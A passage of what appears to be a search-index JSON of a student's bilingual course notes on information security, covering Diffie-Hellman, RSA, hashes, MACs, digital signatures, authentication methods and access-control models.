\uff0c\u89c1PPT 20</li> <li>\u200b\u200b</li> </ul> <p>\u9664\u4e86block cipher\u4ee5\u5916\uff0c\u8fd8\u6709stream cipher</p> <p>The key distribution problem</p> <p>KDC key distribution center</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#public-key-cryptography","title":"Public key cryptography","text":"<p>secret key cryptography \u6240\u5b58\u5728\u7684\u95ee\u9898</p> <ul> <li>\u5bc6\u94a5\u5206\u53d1\u95ee\u9898</li> <li>Alice\u65e0\u6cd5\u8bc1\u660e\u81ea\u5df1\u5230\u5e95\u6709\u6ca1\u6709\u53d1\u4fe1\u606f\uff0c\u6709plagiarizes\u7684\u5acc\u7591 \u527d\u7a83</li> </ul> <p>\u516c\u94a5\u7cfb\u7edf\u7684\u4e00\u4e9b\u5143\u7d20</p> <ul> <li>public key KU</li> <li>private key KR</li> </ul> <p>\u6210\u5c31\u4e00\u4e2a\u6210\u529f\u7684\u516c\u94a5\u7cfb\u7edf\u7684\u5173\u952e\u662f\u627e\u5230\u4e00\u4e2aone-way function\u5c31\u662f\u6b63\u5411\u5bb9\u6613\u53cd\u5411\uff08inverse\uff09\u96be\u7684\u95ee\u9898</p> <p>Requirement of public key cryptography</p> <ul> <li>key generation is easy</li> <li>Encryption is acceptable in time</li> <li>Decryption is acceptable in time</li> <li>\u653b\u51fb\u8005\u7684\u4fe1\u606f\u65e0\u6cd5\u83b7\u53d6\u5230\u660e\u6587\u548c\u79c1\u94a5</li> </ul> <p>DH \u7b97\u6cd5 diffie-hellman algorithm</p> <p>\u6211\u4eec\u6709\u4e00\u4e2aprime number p \u548c \u4e00\u4e2a Integer g</p> <ul> <li>g is a primitive root of p</li> <li>\u5bf9\u4e8e\u4efb\u610f\u4e00\u4e2a\u6574\u6570A\uff08\\(0\\leq A\\leq p-1\\)\uff09\uff0c\u6211\u4eec\u80fd\u552f\u4e00\u627e\u5230\u4e00\u4e2aexponent a\u662f\u7684   \u200b\\(A = g^amod\\ p\\) \u5176\u4e2d \\(0\\leq a \\leq p-1\\)</li> <li>\u6211\u4eec\u79f0a\u662fA\u7684discrete logarithm \u79bb\u6563\u5bf9\u6570 base g and mod p</li> <li>p \u548c g\u662f\u56fa\u5b9a\u7684\uff0ca\u63a8\u51faA\u662f\u5bb9\u6613\u7684\uff0c\u4f46\u662fA\u63a8\u51faa\u662f\u4e0d\u5bb9\u6613\u7684</li> <li>\u5e76\u4e14\u6211\u4eec\u6709 \\(g^{ab} mod\\ p = (g^amod \\ p)^b mod \\ p = (g^bmod \\ p)^a mod \\ p\\)</li> </ul> <p>\u901a\u8fc7\u4ee5\u4e0a\u8fd9\u4e9b\u7406\u8bba\u57fa\u7840\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5efa\u7acb\u51fa\u4e00\u4e2a\u516c\u94a5\u7cfb\u7edf\uff0cPrinciple of Diffie-Hellman</p> <p>\u200b\u200b</p> <p>Example of Diffie-Hellman</p> <p>DH\u7b97\u6cd5\u7684\u4e2d\u95f4\u4eba\u653b\u51fb man-in-the-middle attack, \u5b9e\u9645\u4e0aAlice\u548cBob\u90fd\u662f\u4e0eCarol\u4ea4\u6362\u4e86Session key</p> <p>\u200b\u200b</p> <p>RSA algorithm</p> <p>\u5176\u5355\u5411\u51fd\u6570one way function\u662f \u5927\u8d28\u6570\u4e58\u6cd5\uff0c\u53cd\u4e4b\u5c31\u662f\u5927\u5408\u6570\u7684\u5206\u89e3\uff0c\u6211\u4eec\u5b9a\u4e49\\(\\phi(n)\\)\u662f\u5c0f\u4e8en\u5e76\u4e14\u4e0en\u4e92\u8d28\u7684\u6b63\u6574\u6570\u7684\u4e2a\u6570(\u5176\u88ab\u79f0\u4e3aEuler's totient function)</p> <ul> <li>\u5982\u679cn\u4e3a\u8d28\u6570\uff0c\u663e\u7136 \\(\\phi(n) = n-1\\)</li> <li>\u5982\u679cn\u4e3a\u5408\u6570\uff0c\u6211\u4eec\u5b58\u5728\u4e00\u4e2a\u6570\u5b66\u5b9a\u7406\u6765\u8ba1\u7b97 \\(\\phi(n)\\) \u5bf9n\u505a\u8d28\u56e0\u6570\u5206\u89e3\uff0c\u8bb0\u5f55\u5176\u4e2d\u5404\u4e0d\u76f8\u540c\u7684\u8d28\u6570\uff0c\u8bb0\u4e3a \\(p_i\\) \u6211\u4eec\u6709</li> <li> \\[   \\phi(n) = n(1 - \\frac{1}{p_1})(1-\\frac{1}{p_2})...(1-\\frac{1}{p_k})   \\] </li> <li>\u5bf9\u4e8e\u90fd\u4e3a\u6307\u6570\u7684p\uff0cq\uff0c\u6211\u4eec\u6709\\(\\phi(pq) = \\phi(p)\\phi(q)\\)</li> </ul> <p>\u6211\u4eec\u6709Euler's theorem</p> <ul> <li>\u5982\u679cn\u548ca\u90fd\u662f\u6b63\u8d28\u6570\uff0c\u6709\\(a^{\\phi(n)} \\equiv 1(mod \\ n)\\)  \u8bc1\u660e\uff1f</li> </ul> <p>\u6709\u4e86\u4ee5\u4e0a\u7406\u8bba\u57fa\u7840\uff0c\u6211\u4eec\u5f00\u59cb\u601d\u8003RSA\u7684\u8fc7\u7a0b</p> <ul> <li>\u6211\u4eec\u9009\u62e9\u4e24\u4e2a\u6307\u6570p\uff0cq\uff08\u5f88\u5927\u7684\u6307\u6570\uff0c\u81f3\u5c11\u662f100\u4f4d\uff09\uff0c\u5e76\u4e14\u8bbe \\(n=p*q\\)</li> <li> <p>\u627e\u5230\u4e24\u4e2a\u6570e\uff0cd\uff0c\u6ee1\u8db3</p> </li> <li> <p>e\u548c\\((p-1)(q-1)\\)\u4e92\u8d28\uff0c\u5e76\u4e14\\(1&lt;e,d&lt;(p-1)(q-1)\\)</p> </li> <li>\\(e*d\\equiv 1(mod(p-1)(q-1))\\)</li> <li>\u5176\u4e2de\uff0cn\u662f\u516c\u94a5\uff0cd\u662f\u79c1\u94a5</li> <li>\u52a0\u5bc6\uff1a\u6211\u4eec\u6709\u660e\u6587m\uff0c\u627e\u5230Bob\u7684\u516c\u94a5\uff0c\u52a0\u5bc6\u4e3a\\(c = m^e mod\\ n\\)\uff0c\u628ac\u53d1\u9001\u7ed9Bob</li> <li>\u89e3\u5bc6\uff1a\u6211\u4eec\u6709\u5bc6\u6587c\uff0c\\(m = c^d mod\\ n\\)</li> </ul> <p>\u200b\u200b</p> <p>\u6839\u636e\u4e0a\u9762\u7684\u7406\u8bba\u90e8\u5206\uff0c\u6211\u4eec\u53ef\u4ee5\u8bc1\u660eRSA\u7684\u6b63\u786e\u6027\u548c\u5b89\u5168\u6027</p> <p>\u89c1PPT 48\u5de6\u53f3\u5185\u5bb9</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#security-service","title":"Security service","text":""},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#digital-signature","title":"digital signature","text":"<p>\u5bc6\u7801\u5b66\u7684\u52a0\u5bc6\u89e3\u5bc6\u7cfb\u7edf\u65e0\u6cd5\u89e3\u51b3\u4e00\u4e2a\u95ee\u9898\uff0c\u6bd4\u5982Bob\u634f\u9020\u4e00\u4e2a\u4fe1\u606f\uff0c\u8bf4\u662fAlice\u53d1\u7684\uff1bAlice\u53d1\u4e86\u4e00\u4e2a\u4fe1\u606f\uff0c\u4f46\u4e8b\u540e\u5176\u5426\u8ba4\u4e86\u8fd9\u4e00\u70b9\u3002</p> <p>\u6211\u4eec\u65e5\u5e38\u751f\u6d3b\u4e2d\u4f1a\u4f7f\u7528Signature\uff0c\u4e5f\u5c31\u662f\u7b7e\u540d\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898</p> <p>\u5bf9\u4e8e\u624b\u5199\u7684Signature\uff0c\u6709\u4ee5\u4e0bfeature</p> <p>\u200b\u200b</p> <p>\u5bf9\u4e8edigital signature, \u6709\u4ee5\u4e0b\u8981\u6c42</p> <ul> <li>\u53ef\u4ee5\u4e0e\u76f8\u5e94\u7684\u6587\u4ef6\u7ed1\u5b9a bound with signed document\uff0c\u9632\u6b62\u7b7e\u7f72\u7684\u6587\u4ef6\u88ab\u4fee\u6539</li> <li>\u6536\u4ef6\u4eba\u53ef\u4ee5\u9a8c\u8bc1\uff0c\u4efb\u4f55\u4eba\u4e0d\u80fd\u4f2a\u9020</li> <li>\u53d1\u4ef6\u4eba\u4e0d\u53ef\u5426\u8ba4\u8fd9\u4e2a\u7b7e\u540d \u9700\u8981\u4f7f\u7528\u53d1\u4ef6\u4ebaunique\u7684\u4fe1\u606f</li> <li>\u7b2c\u4e09\u65b9\u53ef\u4ee5\u68c0\u67e5\u548c\u786e\u8ba4\u8fd9\u4e2a\u7b7e\u540d</li> <li>\u53ef\u4ee5\u9a8c\u8bc1\u524d\u9762\u7684\u4f5c\u8005\uff0c\u65e5\u671f\uff0c\u65f6\u95f4\uff0c\u5185\u5bb9\u7b49</li> </ul> <p>\u4f7f\u7528\u516c\u94a5\u52a0\u5bc6\u7cfb\u7edf\uff0c\u53ef\u4ee5\u652f\u6301digital signature</p> <ul> <li>\u53d1\u9001\u8005\u7528\u5176\u79c1\u94a5\u5bf9\u6587\u4ef6\u8fdb\u884c\u7b7e\u540d</li> <li>\u63a5\u53d7\u8005\u7528\u53d1\u9001\u8005\u7684\u516c\u94a5\u8fdb\u884c\u8ba4\u8bc1</li> <li>\u53d1\u9001\u8005\u7528\u63a5\u53d7\u8005\u7684\u516c\u94a5\u8fdb\u884c\u52a0\u5bc6</li> <li>\u63a5\u53d7\u8005\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u8fdb\u884c\u89e3\u5bc6</li> <li>\u200b\u200b</li> </ul> <p>\u4ee5RSA\u7cfb\u7edf\u4e3a\u4f8b * \u770b11\u9875</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#one-way-hash-algorithm","title":"one-way hash algorithm","text":"<p>\u5f53\u6211\u4eec\u9700\u8981\u7b7e\u540d\u7684\u6587\u672c\u5f88\u957f\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5f80\u5f80\u4f1a\u9009\u62e9\u5bf9\u5176hash-value\u8fdb\u884c\u7b7e\u540d\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5355\u9879hash\u51fd\u6570</p> <p>\u5355\u5411hash\u51fd\u6570\u7684\u4e00\u4e2a\u7279\u70b9\u5c31\u662f\u5176\u8f93\u51fa\u7684\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\uff0c\u6bd4\u5982MD5\u662f128\u4f4d\uff1bSHA-1\u662f160\u4f4d</p> <p>\u4e00\u4e2a\u597d\u7684\u5355\u5411hash\u51fd\u6570\u6709\u4ee5\u4e0b\u7279\u70b9</p> <ul> <li>\u6b63\u5411\u5bb9\u6613\u8ba1\u7b97</li> <li>\u53cd\u5411\u96be\u8ba1\u7b97\uff0c\u56fa\u5b9a\u7ed9\u4e00\u4e2ahash\u503ch\uff0c\u6211\u4eec\u65e0\u6cd5\u627e\u5230\u4e00\u4e2am\uff0c\u4f7f\u5f97\\(H(m) = h\\)</li> <li>\u96be\u4ee5\u53d1\u751f\u51b2\u7a81\uff0c\u4e5f\u5c31\u662f\u8bf4\u96be\u4ee5\u627e\u5230\u4e24\u4e2am\uff0c\u4f7f\u4ed6\u4eec\u62e5\u6709\u76f8\u540c\u7684hash_value</li> </ul> <p>\u4e00\u4e9b\u5e38\u89c1\u7684\u5355\u5411hash\u51fd\u6570</p> <p>\u200b\u200b</p> <p>\u4ee5MD5\u4e3a\u4f8b</p> <p>MD5\u7684\u5904\u7406\u5206\u6210\u4e24\u90e8\u5206\uff0cpadding\u548chashing*</p> <ul> <li>padding\u5c06\u6574\u4e2a\u5b57\u7b26\u4e32\u5207\u5272\u6210\u4e00\u7cfb\u5217512-bit\u7684\u5c0f\u5757</li> <li>\u6bcf\u4e2a\u5c0f\u5757\u8f6c\u6362\u621016\u4e2a32-bit\u7684\u6574\u6570 \u89c1P16</li> </ul> <p>\u9488\u5bf9\u5355\u5411Hash\u51fd\u6570\u7684\u653b\u51fb\u4e00\u822c\u6709\u4e24\u79cd</p> <ul> <li> <p>Preimage attack \u5bf9\u4e8e\u7279\u5b9a\u7684hash value\uff0c\u8bd5\u56fe\u627e\u5230\u4e00\u4e2aMessage</p> </li> <li> <p>Preimage resistance \u7ed9\u5b9ahash value \u627e\u4e0d\u5230message</p> </li> <li>Second-preimage resistance \u7ed9\u5b9a\u4e00\u4e2amessage\uff0c\u627e\u4e0d\u5230\u53e6\u4e00\u4e2amessage\u4e0e\u5176\u6709\u76f8\u540c\u7684hash value</li> <li>Collsion attack \u8bd5\u56fe\u627e\u5230\u4e24\u4e2a\u4e0d\u540c\u7684\u8f93\u5165\uff0c\u62e5\u6709\u76f8\u540c\u7684hash value</li> </ul> <p>\u5bf9\u4e8e\u957f\u660e\u6587\u7684\u7b7e\u540d\u6d41\u7a0b P21</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#mac","title":"MAC","text":"<p>MAC\uff0c\u4e5f\u5373Message Authentication Code\uff0c\u4e5f\u88ab\u6210\u4e3a keyed hash function\uff0c\u662f\u7528\u4e8e\u68c0\u6d4b\u6d88\u606f\u662f\u5426\u88ab\u7be1\u6539\uff0c\u4e5f\u5373\u6d88\u606f\u7684\u5b8c\u6574\u6027\u7684\u3002</p> <p>\u6211\u4eec\u4ecb\u7ecd\u5176\u4e2d\u51e0\u4e2a</p> <p>HMAC</p> <p>\u662fHash based message authentication code\uff0c\u4f7f\u7528\u4e0d\u540c\u7684\u5355\u5411hash\u51fd\u6570\u6765\u6784\u5efaHMAC\uff0c\u76f8\u6bd4\u4e8e\u5355\u5411hash\u51fd\u6570\uff0cHMAC\u66f4\u96be\u4ee5\u53d1\u751fcollision\uff0c\u4f8b\u5982HMAC-MD5, HMAC-SHA1\uff0c\u867d\u7136\u5176\u672c\u8eab\u5bf9\u5e94\u7684\u5355\u5411hash\u51fd\u6570\u5df2\u7ecf\u662f\u4e0d\u5b89\u5168\u7684\u4e86\uff0c\u4f46\u662f\u5bf9\u5e94\u7684HMAC\u4ecd\u7136\u662f\u6709\u6548\u7684</p> <p>\u200b\u200b</p> <p>CBC-MAC</p> <p>cipher block chaining message authentication code.  wjgg\u5728\u8fd9\u91cc\u5199\u7684\u5f88\u6e05\u695a</p> <p>\u200b\u200b</p> <p>difference of MAC and digital signature</p> <p>MAC</p> <ul> <li>\u63a5\u53d7\u8005\u548c\u53d1\u9001\u8005\u9700\u8981\u5171\u4eab\u4e00\u4e2a\u5bc6\u94a5</li> <li>\u53ea\u80fd\u88ab\u7279\u6b8a\u7684\u63a5\u53d7\u8005\u8ba4\u8bc1</li> <li>\u4e0d\u63d0\u4f9b\uff0c\u4e0d\u53ef\u5426\u8ba4\u6027</li> <li>\u4f46\u662fMAC\u66f4\u5feb\uff0c\u5e76\u4e14\u4e0d\u53ef\u5426\u8ba4\u6027\u4e0d\u662f\u6240\u6709\u65f6\u5019\u90fd\u9700\u8981\u7684</li> </ul> <p>Digital Signature</p> <ul> <li>\u53ef\u4ee5\u88ab\u6240\u6709\u7684\u63a5\u53d7\u8005\u8ba4\u8bc1\uff0c\u53ea\u9700\u8981\u53d1\u9001\u8005\u7684\u516c\u94a5</li> <li>\u63d0\u4f9b\u4e0d\u53ef\u5426\u8ba4\u6027</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#pgp","title":"PGP","text":"<p>PGP \u662f Pretty good privacy\uff0c\u662f\u4e00\u4e2a\u5e7f\u6cdb\u4f7f\u7528\u7684\u90ae\u4ef6\u548c\u6587\u4ef6\u5b58\u50a8\u7684\u5b89\u5168\u5e94\u7528\uff0c\u6709\u4ee5\u4e0b\u670d\u52a1\uff0c\u6570\u5b57\u7b7e\u540d\uff0c\u5b8c\u6574\u6027\u68c0\u67e5\uff0c\u4fe1\u606f\u52a0\u5bc6\uff0c\u6570\u636e\u538b\u7f29\uff0c\u7b49\u7b49 \u89c1PPT29</p>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#authentication","title":"Authentication","text":"<ul> <li>\u4f60\u662f\u8c01</li> <li>\u4f60\u5982\u4f55\u5411\u4ed6\u4eba\u6216\u7535\u8111\u7cfb\u7edf\u8bc1\u660e\u4f60\u662f\u4f60\u6240\u5ba3\u79f0\u7684\u5b58\u5728</li> <li>\u9700\u8981\u63a7\u5236\u8bbf\u95ee\u7684\u7cfb\u7edf\u90fd\u9700\u8981\u5904\u7406\u8fd9\u4e2a\u95ee\u9898</li> </ul> <p>\u6709\u5f88\u591a\u4e1c\u897f\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u505a\u8ba4\u8bc1</p> <p>\u200b\u200b</p> <p>password-based authentication</p> <p>\u7cfb\u7edf\u5b58\u50a8\u8ba4\u8bc1\u7528\u6237\u7684\u5bc6\u7801\uff0c\u7528\u5176\u6765\u68c0\u67e5</p> <ul> <li>\u5728\u5bc6\u7801\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e0d\u592a\u5b89\u5168</li> <li>\u5bc6\u7801\u7684\u5b58\u50a8\u4e0d\u592a\u5b89\u5168</li> <li>\u7528\u6237\u53ef\u80fd\u4f1a\u504f\u5411\u4e8e\u5bb9\u6613\u8bb0\u5fc6\u7684\u5bc6\u7801\uff0c\u5bb9\u6613\u88ab\u7834\u89e3</li> </ul> <p>\u73b0\u4ee3\u7684\u7cfb\u7edf\u4e5f\u5bf9\u5bc6\u7801\u8ba4\u8bc1\u505a\u4e86\u4e00\u7cfb\u5217\u7684\u4fdd\u62a4\uff0c\u6bd4\u5982\u9650\u5236\u5c1d\u8bd5\u5bc6\u7801\u7684\u6b21\u6570\uff0c\u4e25\u683c\u5316\u4fee\u6539\u5bc6\u7801\u7684\u6d41\u7a0b\u7b49\u7b49</p> <p>\u200b\u200b</p> <p>\u65e9\u671f\u5bc6\u7801\u5b58\u50a8\u7684\u4e00\u4e9b\u5b9e\u73b0</p> <ul> <li>\u53ea\u5b58\u50a8\u5bc6\u7801\u7684hash value</li> </ul> <p>\u65e9\u671f\u7684Unix\u5bc6\u7801</p> <p>Traditional dictionary attack</p> <ul> <li>unix \u7684password file \u662fworld readable</li> <li> <p>\u5f88\u591a\u5bc6\u7801\u6765\u81ea\u4e8e\u5f88\u5c0f\u7684dictionary\uff0c\u5bf9\u5b57\u5178\u4e2d\u7684\u8bcd\u8fdb\u884chash\uff0c\u5e76\u6bd4\u8f83hash\u503c\uff0c\u5982\u679c\u5339\u914d\u6210\u529f\u4e86\u5c31\u7834\u89e3\u4e86\u8be5\u5bc6\u7801</p> </li> <li> <p>\u653b\u51fb\u8005\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u8ba1\u7b97\u5b8c\u6240\u6709\u7684dictionary\u7684hash\u503c\uff0c\u8fdb\u884c\u5339\u914d</p> </li> </ul> <p>\u5bf9\u6297\u653b\u51fb\u7684\u673a\u5236</p> <ul> <li>salting \u8ba1\u7b97hash value\u65f6\uff0c\u4f1a\u5c06salt\u52a0\u5165\u5bc6\u7801\u540e\u518d\u505ahash\uff0csalt\u662f\u521d\u6b21\u8bbe\u5b9a\u5bc6\u7801\u65f6\u4ea7\u751f\u7684\u968f\u673a\u6570\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u5728\u9488\u5bf9\u4e00\u4e2apassword\u7684\u65f6\u5019\uff0c\u9700\u8981\u5bf9\u6bcf\u4e00\u4e2adictionary word\u505a\u4e00\u6b21\u8ba1\u7b97\uff0c\u4f7f\u5f97\u5b57\u5178\u653b\u51fb\u53d8\u5f97\u56f0\u96be\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u80fd</li> <li>Shadow password, \u5c06password\u7684hash value\u5b58\u5728\u4e00\u4e2a\u4ec5\u6709\u7cfb\u7edf\u7ba1\u7406\u5458root\u53ef\u8bfb\u7684\u6587\u4ef6\u4e2d\uff0c\u5e76\u4e14\u6dfb\u52a0\u5bc6\u7801\u7684expiration dates \u5230\u671f\u65e5\u671f</li> </ul> <p>\u5bc6\u7801\u4f7f\u7528\u7684\u4e00\u4e9b\u5e38\u89c1\u9519\u8bef\u4ee5\u53ca\u9700\u8981\u6ce8\u610f\u7684\u70b9 PPT 13</p> <p>PPT13</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>biometric/behaviometric authentication</p> <p>\u5305\u62ec\u6307\u7eb9\uff0c\u7b14\u8ff9\u7b49</p> <ul> <li>\u4f18\u70b9\u5728\u4e8e\u4e0d\u592a\u5bb9\u6613\u88ab\u5077\u7a83\uff0c\u635f\u5931\u548c\u9057\u5fd8</li> <li>\u7f3a\u70b9\u5728\u4e8e \u68c0\u6d4b\u88c5\u5907\u6bd4\u8f83\u6602\u8d35\uff0c\u6bd4\u8f83\u7b97\u6cd5\u7684\u7cbe\u786e\u6027\u5b58\u5728\u95ee\u9898\uff0c\u5e76\u4e14\u9690\u79c1\u95ee\u9898\u6bd4\u8f83\u4e25\u91cd</li> </ul> <p>\u751f\u7269\u8ba4\u8bc1\u7684\u9519\u8bef\u7387</p> <ul> <li>false accept rate</li> <li>false reject rate</li> <li>\u5982\u679c\u4e0a\u8ff0\u4e24\u4e2a\u6982\u7387\u76f8\u540c\uff0c\u79f0\u4e3a equal error rate</li> <li>Increasing the threshold value of accept will increase the false accept rate and reduce the false reject rate.</li> </ul> <p>\u5bf9\u4e8e\u4e00\u4e2a\u751f\u7269\u8ba4\u8bc1\u7cfb\u7edf\u9700\u8981\u8003\u8651\u7684\u5185\u5bb9</p> <p>\u200b\u200b</p> <p>\u8ba8\u8bba\u95ee\u9898 \u5bc6\u7801\u4f1a\u6d88\u5931\u5417</p> <p>NetWork Authentication</p> <p>\u4e92\u8054\u7f51\u4e24\u7aef\u7684\u7528\u6237\u5982\u4f55\u505a\u8ba4\u8bc1\uff0c\u6709\u4e00\u4e9b\u65b9\u6cd5\u548c</p> <p>\u79c1\u94a5\u7cfb\u7edf\u548c\u516c\u94a5\u7cfb\u7edf\u90fd\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e00\u822c\u90fd\u662f\u4f7f\u7528\u516c\u94a5\u7cfb\u7edf\uff0c\u53ef\u4ee5\u5bf9\u6297\u91cd\u653e\u653b\u51fb</p> <p>\u4e0b\u56fe\u4e2dv5\u4f7f\u7528\u7684\u662f\u79c1\u94a5\u7cfb\u7edf\uff0cv6\u4f7f\u7528\u7684\u4e8b\u516c\u94a5\u7cfb\u7edf</p> <p>\u200b\u200b</p> <p>Kerberos</p> <p>\u5728\u5206\u5e03\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u670d\u52a1\u5668\u9650\u5236\u6388\u6743\u7528\u6237\u7684\u8bbf\u95ee\uff0c\u533a\u5206\u6bcf\u7c7b\u7528\u6237\u9700\u8981\u7684\u670d\u52a1</p> <p>\u6709\u4e00\u7cfb\u5217\u7684\u76ee\u6807</p> <ul> <li>Safety</li> <li>Reliablity</li> <li>Transparency</li> <li>Scalability</li> </ul> <p>\u5177\u4f53\u7684\u64cd\u4f5c\u548c\u6982\u5ff5\u7ec6\u8282 \u89c1PPT26</p> <p>\u57fa\u4e8eticket\u8fdb\u884c\u8ba4\u8bc1</p> <p>\u7f3a\u9677</p> <ul> <li>\u4f9d\u8d56\u7cfb\u7edf\u65f6\u95f4\u7684\u540c\u6b65</li> <li>guessing attack \u5982\u679c\u5bc6\u7801\u5f88\u5f31\u5bb9\u6613\u88ab\u731c\u5230\u7684\u8bdd\u662f\u6709\u95ee\u9898\u7684</li> <li>key storage \u662f\u4e2a\u95ee\u9898</li> </ul>"},{"location":"ZJU-course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86/#authorization","title":"Authorization","text":"<p>authorization\u57fa\u672c\u7b49\u540c\u4e8e\u8bbf\u95ee\u63a7\u5236\uff0c\u6709\u4e00\u4e9b\u6982\u5ff5</p> <ul> <li>Subject \u4e00\u4e2a\u80fd\u591f\u8bbf\u95ee\u4e1c\u897f\u7684\u5b9e\u4f53\uff0c\u5305\u62ecuser\u548c\u5e94\u7528\u8fdb\u7a0b\u7b49\u7b49</li> <li>Object \u88ab\u8bbf\u95ee\u7684\u4e1c\u897f file\uff0cprogram\uff0cdata\u7b49</li> <li>Privilege Subject\u5bf9\u4e8eObject\u7684\u67d0\u79cd\u6743\u9650\uff0c\u5305\u62ecread, write, delete\u7b49\u7b49</li> </ul> <p>Secure Access Control</p> <ul> <li>\u4e09\u4e2a\u4e3b\u8981\u529f\u80fd Authorization, Revoke, Checker</li> <li>\u4e24\u4e2a\u9636\u6bb5 Make Policy, Execute Policy</li> </ul> <p>\u5b89\u5168\u8bbf\u95ee\u63a7\u5236\u6709\u4e09\u79cdModel</p> <ul> <li>DAC Discretionary Access Control \u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236</li> <li>MAC Mandatory Access Control \u5f3a\u5236\u8bbf\u95ee\u63a7\u5236</li> <li>RBAC Role-Based Access Control</li> </ul> <p>DAC</p> <p>\u6839\u636e\u8bbf\u95ee\u4e3b\u4f53\uff08Subject\uff09\u7684\u8eab\u4efd\u548c\u6743\u9650\u6765\u505a\u51fa\u51b3\u5b9a\uff0c\u5b58\u5728\u4e00\u4e9b\u7279\u6743\u7684\u4e3b\u4f53\u53ef\u4ee5\u628a\u6743\u9650\u6388\u4e88\u4ed6\u4eba</p> <p>\u7f3a\u70b9\u662f\u8bbf\u95ee\u6743\u9650\u63a7\u5236\u4e0d\u4e25\u683c</p> <p>Access control matrix</p> <p>\u6709\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u5206\u522b\u662f\u6a2a\u7eb5\u7684\u5173\u7cfb</p> <ul> <li>Access control list: \u6bcf\u4e00\u4e2aObject\u90fd\u5173\u8054\u7740a list of Subject permitted to access it.</li> <li>Capability list: \u5bf9\u4e8e\u6bcf\u4e2aSubject\uff0c\u90fd\u5173\u8054\u7740a list of Object it can access</li> </ul> <p>\u200b\u200b</p> <p>\u4f8b\u5b50</p> <p>Unix OS \u4f7f\u7528 accessing control list \u6765\u7ba1\u7406\u6587\u4ef6</p> <ul> <li>\u5c06user\u533a\u5206\u6210\u4e09\u7c7b\uff1a\u6587\u4ef6\u7684Owner\uff08u\uff09\uff0c\u548cfile owner\u5206\u5728\u540c\u4e00\u7ec4\u7684(g)\uff0c\u5176\u4ed6\u7528\u6237(o)</li> <li>\u5c06permission\u5206\u4e3a\u4e09\u79cd: Read r, Write w, Execute x</li> <li>\u75289\u4e2abit\u6765indicate\u6587\u4ef6\u7684access control list, 1-3\u662fowner\u7684\u6743\u9650\uff0c 4-6\u662fgroup member\u7684\u6743\u9650\uff0c7-9 \u662fother\u7684\u6743\u9650</li> </ul> <p>MAC</p> <p>\u7ed9Subject\u548cObject\u4ee5\u4e0d\u540c\u7684\u5b89\u5168\u7b49\u7ea7\uff0c\u901a\u8fc7\u5b89\u5168\u7b49\u7ea7\u6765\u5224\u65ad\u662f\u5426\u6709\u6743\u9650</p> <p>Bell-LaPadula Model \u7528\u6765ensure confidentiality \u786e\u4fdd\u673a\u5bc6\u6027</p> <ul> <li>No Read Up \u4e0d\u80fd\u9605\u8bfb\u9ad8level\u7684file</li> <li>No Write Down \u4e0d\u80fd\u5199\u4f4elevel\u7684file</li> </ul> <p>Biba Model \u7528\u6765Ensure integrity \u786e\u4fdd\u5b8c\u6574\u6027</p> <ul> <li>No Read Down</li> <li>No Write Up \u4e0e\u4e0a\u8ff0\u76f8\u53cd</li> </ul> <p>Secure Label \u53ef\u4ee5\u9632\u6b62 Trojan Horse \u89c1PPT 39 40</p> <p>Covert Channel \u9690\u853d\u901a\u9053</p> <p>\u5176\u4f7f\u7528\u7cfb\u7edf\u8d44\u6e90\u4f46\u662f\u4e0d\u901a\u77e5Subject\uff0c\u8fd9\u662f\u4e00\u79cdcomputer security attack\uff0c\u5728\u8fdb\u7a0b\u4e4b\u95f4\u4f20\u8f93\u4fe1\u606f</p> <p>\u5229\u7528\u7cfb\u7edf\u8d44\u6e90\u8fdb\u884c\u901a\u4fe1\u7684\u901a\u9053\uff0c\u901a\u8fc7\u4e00\u4e9b\u7cfb\u7edf\u8d44\u6e90\u7684\u53d8\u5316\u6765\u83b7\u53d6\u9ad8\u5bc6\u6587\u6863\u5728\u505a\u4ec0\u4e48</p> <p>\u8fd9\u79cd\u653b\u51fb\u65e0\u6cd5\u88ab eliminated, 